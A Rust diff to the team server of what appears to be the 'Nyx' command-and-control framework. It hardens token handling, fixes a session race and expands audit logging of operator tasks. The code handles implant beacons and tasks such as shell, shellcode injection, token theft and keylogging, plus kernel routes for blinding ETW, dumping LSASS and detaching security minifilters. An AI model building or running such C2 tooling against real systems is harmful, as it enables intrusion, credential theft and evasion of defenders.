@@ -123,7 +123,8 @@ impl AppState {
 impl Default for AppState {
     fn default() -> Self {
         Self {
-            keypair: ServerKeypair::generate(),
+            keypair: ServerKeypair::generate()
+                .expect("default AppState keypair: OsRng is infallible on supported targets"),
             sessions: DashMap::new(),
             profile: None,
             api_token: None,
@@ -237,7 +238,8 @@ pub fn load_or_create_keypair(
             .map_err(|_| anyhow::anyhow!("keyfile {} is not 32 bytes", path.display()))?;
         Ok(ServerKeypair::from_secret_bytes(arr))
     } else {
-        let kp = ServerKeypair::generate();
+        let kp = ServerKeypair::generate()
+            .map_err(|_| anyhow::anyhow!("CSPRNG failure during keypair generation"))?;
         std::fs::write(path, kp.to_secret_bytes())?;
         #[cfg(unix)]
         {
@@ -324,17 +326,29 @@ pub fn router(state: Arc<AppState>) -> Router {
         .route("/api/creds/delete", post(delete_cred))
         .route("/api/audit", get(get_audit))
         .route("/api/audit/verify", get(verify_audit))
-        // Kernel daemon bridge routes (P6).
-        .route("/api/kernel/status", get(kernel::driver_status))
-        .route("/api/kernel/blind-etw", post(kernel::blind_etw))
-        .route("/api/kernel/hide", post(kernel::hide))
-        .route("/api/kernel/dump-lsass", post(kernel::dump_lsass))
-        .route("/api/kernel/neutralize", post(kernel::neutralize))
-        .route(
-            "/api/kernel/detach-minifilter",
-            post(kernel::detach_minifilter),
-        )
         .layer(DefaultBodyLimit::max(4 * 1024 * 1024));
+
+    // Kernel daemon bridge routes (P6): ONLY register when a `KernelBridge` is
+    // wired into AppState (i.e. NYX_KERNEL_DAEMON was set at boot). Without a
+    // daemon every handler returns a misleading `{"ok":false,"err":"no daemon"}`,
+    // so registering dead routes that always fail just confuses operators. When
+    // the bridge is absent, the routes aren't mounted at all — a request to
+    // `/api/kernel/*` then gets a plain 404, which is the honest signal that
+    // the feature isn't enabled (set NYX_KERNEL_DAEMON=<host:port> to enable).
+    let api_routes = if state.kernel.is_some() {
+        api_routes
+            .route("/api/kernel/status", get(kernel::driver_status))
+            .route("/api/kernel/blind-etw", post(kernel::blind_etw))
+            .route("/api/kernel/hide", post(kernel::hide))
+            .route("/api/kernel/dump-lsass", post(kernel::dump_lsass))
+            .route("/api/kernel/neutralize", post(kernel::neutralize))
+            .route(
+                "/api/kernel/detach-minifilter",
+                post(kernel::detach_minifilter),
+            )
+    } else {
+        api_routes
+    };
 
     beacon_routes.merge(api_routes).with_state(state)
 }
@@ -444,30 +458,55 @@ fn body_bytes(b: Vec<u8>) -> axum::body::Body {
 }
 
 /// Constant-time byte comparison to avoid timing oracles on secrets.
-/// Constant-time byte comparison that does NOT short-circuit on length.
 ///
-/// A naive `if a.len() != b.len() { return false }` leaks the expected
-/// (secret) length as a timing distinguisher — for an operator API token that
-/// gates tasking on every beacon, that's a real side channel. Instead we scan
-/// every byte of the shorter input and fold a length-mismatch flag into the
-/// same accumulator, so the work depends only on `min(a.len(), b.len())` and
-/// never on where (or whether) the buffers first differ.
+/// Uses `subtle::ConstantTimeEq` so the comparison time depends only on the
+/// input length, not on where (or whether) the buffers differ — important for
+/// an operator API token that gates tasking on every beacon. Slice `ct_eq`
+/// returns `Choice(0)` (unequal) when the lengths differ, so callers comparing
+/// fixed-length tokens are safe; both call sites (`authenticate` legacy token,
+/// `operators::verify_secret` plain marker) compare equal-length hex/bearer
+/// strings. (HIGH-1: the previous SHA-256-pre-hash variant hashed both inputs
+/// first — a needless detour that also widened the secret-material surface.)
 pub(crate) fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
-    use sha2::{Digest, Sha256};
+    use subtle::ConstantTimeEq;
+    a.ct_eq(b).unwrap_u8() == 1
+}
 
-    let mut ha = Sha256::new();
-    ha.update(a);
-    let digest_a = ha.finalize();
+/// Generate a 32-byte (256-bit) random API token as 64 hex chars (P0-2).
+///
+/// Used to auto-secure a non-loopback team-server bind that would otherwise be
+/// open (no operators, no `NYX_TOKEN`). `OsRng` is the OS CSPRNG (getrandom →
+/// BoringSSL/getentropy on macOS, `RtlGenRandom` on Windows); `fill_bytes` is
+/// documented infallible on supported targets.
+pub fn generate_api_token() -> String {
+    use rand::RngCore;
+    let mut bytes = [0u8; 32];
+    rand::rngs::OsRng.fill_bytes(&mut bytes);
+    hex::encode(bytes)
+}
 
-    let mut hb = Sha256::new();
-    hb.update(b);
-    let digest_b = hb.finalize();
+/// True if a `host:port` bind string targets a loopback address (P0-2).
+///
+/// Covers IPv4 `127.0.0.0/8`, `localhost`, and bracketed/bare IPv6 `::1`. A
+/// loopback bind is safe to run without a control-API token; anything else is
+/// reachable from the network and MUST carry auth.
+pub fn is_loopback_bind(addr: &str) -> bool {
+    addr.starts_with("127.")
+        || addr.starts_with("localhost")
+        || addr.starts_with("[::1]")
+        || addr.starts_with("::1")
+}
 
-    let mut diff = 0;
-    for (x, y) in digest_a.iter().zip(digest_b.iter()) {
-        diff |= x ^ y;
+/// Truncate `s` to at most `max` chars, marking a cut with a trailing ellipsis
+/// (HIGH-3). Bounds the size of operator-supplied command args captured in the
+/// audit log so a single task can't bloat `audit.jsonl` unboundedly.
+fn truncate(s: &str, max: usize) -> String {
+    if s.chars().count() <= max {
+        return s.to_string();
     }
-    diff == 0
+    let mut t: String = s.chars().take(max).collect();
+    t.push('…');
+    t
 }
 
 fn handle_beacon(
@@ -554,7 +593,7 @@ fn handle_beacon(
             if raw.counter <= s.last_recv {
                 anyhow::bail!("replayed/stale counter {}", raw.counter);
             }
-            (false, s.key)
+            (false, s.key.clone())
         }
     };
 
@@ -592,6 +631,10 @@ fn handle_beacon(
             .remove(peer)
             .map(|(_, v)| v)
             .unwrap_or_default();
+        // Clone before moving into the Session struct — the reply below still
+        // needs &key to seal the empty-task batch. (SessionKey is no longer Copy
+        // so it has a real Drop that zeroizes; the clone is zeroized on drop.)
+        let reply_key = key.clone();
         let session = Session {
             key,
             info,
@@ -604,7 +647,19 @@ fn handle_beacon(
             ja3: fp.ja3,
             ja4: fp.ja4,
         };
-        st.sessions.insert(raw.pubkey, session);
+        // Atomically check-and-insert. Closes the TOCTOU between the read-guard
+        // `is_new` decision above and the insert: two concurrent check-ins
+        // carrying the same ephemeral pubkey + counter=0 both saw `None`, both
+        // derived the same key, and a plain `insert` here would let the second
+        // silently overwrite the first session — losing its queued pending
+        // tasks. `entry()` holds the DashMap shard write lock across the vacant
+        // check AND the insert, so exactly one racer creates the entry; the
+        // other finds it occupied and reuses it (same derived key, same
+        // empty-task reply). The loser's pre-built `session` is dropped unused
+        // (its SessionKey is zeroized on Drop). The returned guard is a
+        // temporary, dropped at the semicolon, so the shard lock is released
+        // before the scripting event fires below.
+        st.sessions.entry(raw.pubkey).or_insert_with(|| session);
         st.events.fire(&new_event);
         // No tasks queued yet — reply with an empty batch.
         // Reply sealed in the server→implant nonce space (Direction::ServerToClient)
@@ -613,7 +668,7 @@ fn handle_beacon(
             &raw.pubkey,
             Direction::ServerToClient,
             0,
-            &key,
+            &reply_key,
             &Task::encode_vec(&[])?,
         ))
     } else {
@@ -913,7 +968,9 @@ enum JsonCommand {
         sc_hex: String,
     },
     Trex,
-    SetChannel { channel: u8 },
+    SetChannel {
+        channel: u8,
+    },
     Exit,
 }
 
@@ -1102,6 +1159,83 @@ async fn post_task(
         _ => None,
     };
     let cmd_name = command_name(&command);
+    // Build the audit detail while `command` is still borrowed (before it is
+    // moved into the task below). HIGH-3/5: the previous record dropped ALL
+    // command arguments (`{"task_id","command"}`), so post-action forensics
+    // could see that a shell task ran but not WHAT it ran. Record a sanitized
+    // per-variant summary: shell args are truncated, upload records name +
+    // byte count, make-token records DOMAIN\user but NEVER the password.
+    let audit_detail = match &command {
+        Command::Shell { args } => serde_json::json!({
+            "task_id": task_id, "command": "shell", "args": truncate(args, 256)
+        }),
+        Command::Upload { name, data } => serde_json::json!({
+            "task_id": task_id, "command": "upload", "name": name, "bytes": data.len()
+        }),
+        Command::MakeToken { domain, user, .. } => serde_json::json!({
+            "task_id": task_id, "command": "maketoken",
+            "user": format!("{}\\{}", domain, user)
+        }),
+        // BOF execution: log the entry label + string args (truncated), never the
+        // raw COFF `blob` (operator-supplied bytes, large, not forensic-relevant).
+        Command::Bof { name, args, .. } => {
+            let args_t: Vec<String> = args.iter().map(|a| truncate(a, 128)).collect();
+            serde_json::json!({
+                "task_id": task_id, "command": "bof",
+                "name": name, "args": args_t
+            })
+        }
+        // Process injection: log the technique + target pid + sacrificial
+        // spawn target, never the `shellcode` bytes (the payload itself).
+        Command::Inject {
+            method,
+            pid,
+            spawn_to,
+            ..
+        } => serde_json::json!({
+            "task_id": task_id, "command": "inject",
+            "method": method, "pid": pid, "spawn_to": spawn_to
+        }),
+        Command::Download { path } => serde_json::json!({
+            "task_id": task_id, "command": "download", "path": truncate(path, 256)
+        }),
+        Command::StealToken { pid } => serde_json::json!({
+            "task_id": task_id, "command": "stealtoken", "pid": pid
+        }),
+        // Connect opens an outbound relay: log host:port (and the assigned chan
+        // so the operator can correlate), never any token/credential.
+        Command::Connect {
+            host, port, chan, ..
+        } => serde_json::json!({
+            "task_id": task_id, "command": "connect",
+            "target": format!("{host}:{port}"), "chan": chan
+        }),
+        Command::Socks { port, chan, .. } => serde_json::json!({
+            "task_id": task_id, "command": "socks", "port": port, "chan": chan
+        }),
+        Command::Portscan { host, ports } => serde_json::json!({
+            "task_id": task_id, "command": "portscan",
+            "target": truncate(host, 256), "ports": truncate(ports, 128)
+        }),
+        // FileOp: log the operation kind + path (and dest for mv/cp).
+        Command::FileOp { op, path, dest } => {
+            let mut detail = serde_json::json!({
+                "task_id": task_id, "command": "fileop",
+                "op": fileop_label(op), "path": truncate(path, 256)
+            });
+            if let Some(d) = dest {
+                detail["dest"] = serde_json::Value::String(truncate(d, 256));
+            }
+            detail
+        }
+        Command::Screenshot { monitor } => serde_json::json!({
+            "task_id": task_id, "command": "screenshot", "monitor": monitor
+        }),
+        Command::Keylog { action } => serde_json::json!({
+            "task_id": task_id, "command": "keylog", "action": action
+        }),
+        _ => serde_json::json!({ "task_id": task_id, "command": cmd_name }),
+    };
     // Command::Exit instructs the implant to terminate; fire SessionExit now so
     // operator hooks (`on_session_exit`) actually run. Previously the event was
     // dispatched by the Rhai/tracing hooks but never produced, leaving
@@ -1121,12 +1255,7 @@ async fn post_task(
         ));
     }
     if let Some(audit) = &st.audit {
-        audit.append(
-            "task",
-            &op.name,
-            &req.session,
-            serde_json::json!({ "task_id": task_id, "command": cmd_name }),
-        );
+        audit.append("task", &op.name, &req.session, audit_detail);
     }
     (StatusCode::OK, Json(TaskAck { task_id, chan })).into_response()
 }
@@ -1445,6 +1574,17 @@ async fn verify_audit(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Re
         .into_response()
 }
 
+/// Lowercase label for a [`FileOp`] (for the audit log's `op` field).
+fn fileop_label(op: &FileOp) -> &'static str {
+    match op {
+        FileOp::Cd => "cd",
+        FileOp::Mkdir => "mkdir",
+        FileOp::Rm => "rm",
+        FileOp::Mv => "mv",
+        FileOp::Cp => "cp",
+    }
+}
+
 /// Short name for a wire [`Command`] variant (for operator-facing views).
 fn command_name(c: &Command) -> &'static str {
     match c {
@@ -1674,6 +1814,60 @@ mod tests {
         }
     }
 
+    #[test]
+    fn generate_api_token_is_64_hex_chars_and_unique() {
+        // P0-2: the auto-generated control-API token must be 256 bits of OS
+        // CSPRNG entropy (32 bytes → 64 hex chars), all-lowercase-hex, and two
+        // draws must not collide (a collision would imply a broken RNG).
+        let t1 = generate_api_token();
+        let t2 = generate_api_token();
+        assert_eq!(
+            t1.len(),
+            64,
+            "token must be 32 bytes hex-encoded (64 chars)"
+        );
+        assert_eq!(t2.len(), 64);
+        assert!(
+            t1.bytes().all(|b| b.is_ascii_hexdigit()),
+            "token must be hex"
+        );
+        assert_ne!(t1, t2, "two OsRng draws must differ");
+        // Neither all-zero (would indicate a failed/zeroed CSPRNG fill).
+        assert_ne!(t1, "0".repeat(64));
+    }
+
+    #[test]
+    fn is_loopback_bind_classifies_common_addresses() {
+        // P0-2: loopback binds are safe to run without a token; anything else
+        // triggers the auto-token footgun guard. Cover IPv4 loopback, localhost,
+        // and IPv6 ::1 (bracketed with port and bare) — plus the network case.
+        assert!(is_loopback_bind("127.0.0.1:8443"));
+        assert!(is_loopback_bind("127.0.1.5:8443")); // entire 127.0.0.0/8
+        assert!(is_loopback_bind("localhost:8443"));
+        assert!(is_loopback_bind("[::1]:8443"));
+        // network-reachable binds → NOT loopback
+        assert!(!is_loopback_bind("0.0.0.0:8443"));
+        assert!(!is_loopback_bind("10.0.0.5:8443"));
+        assert!(!is_loopback_bind("192.168.1.10:8443"));
+    }
+
+    #[test]
+    fn truncate_passes_short_and_cuts_long_with_ellipsis() {
+        // HIGH-3: audit-log arg capture must be bounded. Short input passes
+        // through unchanged; long input is cut to `max` chars + a trailing
+        // ellipsis so a reviewer can tell it was truncated.
+        assert_eq!(truncate("ls -la", 256), "ls -la");
+        assert_eq!(truncate("", 256), "");
+        let big = "A".repeat(300);
+        let t = truncate(&big, 10);
+        assert_eq!(t.chars().count(), 11, "10 chars + ellipsis");
+        assert!(t.ends_with('…'));
+        assert!(t.starts_with("AAAAAAAAAA"));
+        // exactly `max` chars → unchanged (no ellipsis on the boundary)
+        let exact = "B".repeat(10);
+        assert_eq!(truncate(&exact, 10), exact);
+    }
+
     // ---- JsonCommand → Command 映射（FileOp / Connect / Socks）----
 
     #[test]
@@ -1799,7 +1993,7 @@ mod tests {
         // check — the advisory read-guard check is only an optimization that
         // skips a decrypt for an obvious stale frame.
         let st = AppState::default();
-        let pubkey = ServerKeypair::generate().public_bytes();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:9999".parse().unwrap();
         let (key, checkin) = checkin_frame(&st, &pubkey, 1);
         handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
@@ -1824,7 +2018,7 @@ mod tests {
         // exactly ONE through and reject the other. Before the fix both could
         // pass the advisory read-guard check before either committed last_recv.
         let st = std::sync::Arc::new(AppState::default());
-        let pubkey = ServerKeypair::generate().public_bytes();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:9998".parse().unwrap();
         let (key, checkin) = checkin_frame(&st, &pubkey, 1);
         handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
@@ -1905,7 +2099,7 @@ mod tests {
         }
         assert_eq!(st.sessions.len(), MAX_SESSIONS);
 
-        let pubkey = ServerKeypair::generate().public_bytes();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:7777".parse().unwrap();
         let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
         let err = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
@@ -1923,7 +2117,7 @@ mod tests {
         // entries past MAX_RESULTS_PER_SESSION. Drive it in ONE beacon carrying
         // cap+100 responses (one crypto op, exercises the in-loop drain).
         let st = AppState::default();
-        let pubkey = ServerKeypair::generate().public_bytes();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:7776".parse().unwrap();
         let (key, checkin) = checkin_frame(&st, &pubkey, 1);
         handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin).expect("check-in");
@@ -1964,7 +2158,7 @@ mod tests {
         // time passes it, the server stops serving beacons entirely. Checked at
         // the top of handle_beacon, before parse_frame, so it refuses regardless
         // of the body. Past → refuse; far-future → proceed.
-        let pubkey = ServerKeypair::generate().public_bytes();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:7775".parse().unwrap();
 
         let st = AppState {
@@ -2054,7 +2248,7 @@ mod tests {
         st.events.register(Box::new(RecordingHook(rec.clone())));
         let st = std::sync::Arc::new(st);
 
-        let pubkey = ServerKeypair::generate().public_bytes();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:7774".parse().unwrap();
         let (_key, checkin) = checkin_frame(&st, &pubkey, 1);
         handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
@@ -2123,7 +2317,7 @@ mod tests {
             profile: Some(profile),
             ..AppState::default()
         };
-        let pubkey = ServerKeypair::generate().public_bytes();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:7001".parse().unwrap();
         let (_key, frame) = checkin_frame(&st, &pubkey, 1);
         // Implant side: base64 the frame via the SAME engine the server inverts.
@@ -2154,7 +2348,7 @@ mod tests {
             profile: Some(profile),
             ..AppState::default()
         };
-        let pubkey = ServerKeypair::generate().public_bytes();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
         let peer: std::net::SocketAddr = "127.0.0.1:7002".parse().unwrap();
         let (_key, frame) = checkin_frame(&st, &pubkey, 1);
         let cookie_val = nyx_profile::encode(&[nyx_profile::Step::Base64], &frame);
